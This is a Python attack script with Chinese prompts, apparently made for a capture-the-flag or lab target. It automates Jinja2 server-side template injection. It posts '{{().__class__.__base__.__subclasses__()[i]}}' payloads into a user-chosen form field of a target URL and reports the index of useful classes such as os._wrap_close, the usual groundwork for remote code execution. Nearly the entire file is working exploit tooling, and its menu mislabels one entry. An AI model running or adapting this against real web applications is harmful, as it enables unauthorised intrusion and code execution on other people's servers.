import requests
url = input('请输入URL链接：')

print ("""
        A=os._AddedDllDirectory
        B=os._wrap_close
        C=frozen_importlib._DummyModuleLock
		D=frozen_importlib._ModuleLockManager
		E=frozen_importlib.ModuleSpec
		F=frozen_importlib_external.FileLoader
		G=frozen_importlib_external._NamespacePath
		H=frozen_importlib_external._NamespaceLoader
        I=frozen_importlib_external.FileFinder
		G=zipimport.zipimporter
		K=zipimport._ZipImportResourceReader
		L=sitebuiltins.Quitter
		M=sitebuiltins._Printer
		N=warnings.WarningMessage
		O=warnings.catch_warnings
		P=weakref.finalize
		Q=pickle._Framer
		R=pickle._Unframer
		S=pickle._Pickler
		T=pickle._Unpickler
		U=jinja2.bccache.Bucket
		V=jinja2.runtime.TemplateReference
		W=jinja2.runtime.Context
		X=jinja2.runtime.BlockReference
		Y=jinja2.runtime.LoopContext
		Z=jinja2.runtime.Macro
		1=jinja2.runtime.Undefined
		2=jinja2.environment.Environment
		3=jinja2.environment.TemplateExpression
		4=jinja2.environment.TemplateStream
		5=dis.Bytecode
        6=自定义查询""")

kongbai = (input('输入编码(A-Z,1-6):'))

if kongbai == "A" :
    flag = ("os._AddedDllDirectory")
elif  kongbai == "B":
    flag = ("os._wrap_close")
elif  kongbai == "C":
    flag = ("_frozen_importlib._DummyModuleLock")
elif  kongbai == "D":
    flag = ("_frozen_importlib._ModuleLockManager")
elif  kongbai == "E":
    flag = ("_frozen_importlib.ModuleSpec")
elif  kongbai == "F":
    flag = ("_frozen_importlib_external.FileLoader")
elif  kongbai == "G":
    flag = ("_frozen_importlib_external._NamespacePath")
elif  kongbai == "H":
    flag = ("_frozen_importlib_external._NamespaceLoader")
elif  kongbai == "I":
    flag = ("_frozen_importlib_external.FileFinder")
elif  kongbai == "J":
    flag = ("zipimport.zipimporter")
elif  kongbai == "K":
    flag = ("zipimport._ZipImportResourceReader")
elif  kongbai == "L":
    flag = ("_sitebuiltins.Quitter")
elif  kongbai == "M":
    flag = ("_sitebuiltins._Printer")
elif  kongbai == "N":
    flag = ("warnings.WarningMessage")
elif  kongbai == "O":
    flag = ("warnings.catch_warnings")
elif  kongbai == "P":
    flag = ("weakref.finalize")
elif  kongbai == "Q":
    flag = ("pickle._Framer")
elif  kongbai == "R":
    flag = ("pickle._Unframer")
elif  kongbai == "S":
    flag = ("pickle._Pickler")
elif  kongbai == "T":
    flag = ("pickle._Unpickler")
elif  kongbai == "U":
    flag = ("jinja2.bccache.Bucket")
elif  kongbai == "V":
    flag = ("jinja2.runtime.TemplateReference")
elif  kongbai == "W":
    flag = ("jinja2.runtime.Context")
elif  kongbai == "X":
    flag = ("jinja2.runtime.BlockReference")
elif  kongbai == "Y":
    flag = ("jinja2.runtime.LoopContext")
elif  kongbai == "Z":
    flag = ("jinja2.runtime.Macro")
elif  kongbai == "1":
    flag = ("jinja2.runtime.Undefined")
elif  kongbai == "2":
    flag = ("jinja2.environment.Environment")
elif  kongbai == "3":
    flag = ("jinja2.environment.TemplateExpression")
elif  kongbai == "4":
    flag = ("jinja2.environment.TemplateStream")
elif  kongbai == "5":
    flag = ("dis.Bytecode")
elif  kongbai == "6":
    flag = input ('自定义查询:')


print ("你选择了:" + flag)
kong = input("输入name:")
print ("name = " + kong)

for i in range(500):
        data = { kong : "{{().__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        #name不唯一 需要inpout自定义 11.6
        try:
            response = requests.post(url, data=data)
            if response.status_code == 200:
                if flag in response.text:
                    print(i)
        except requests.exceptions.RequestException as e:
            print(f"请求发生异常: {e}")
        except KeyError as e:
            print(f"数据处理过程中发生键值错误: {e}")
        except Exception as e:
            print(f"其他未知异常: {e}")

#http://192.168.176.129:18080/flaskBasedTests/jinja2/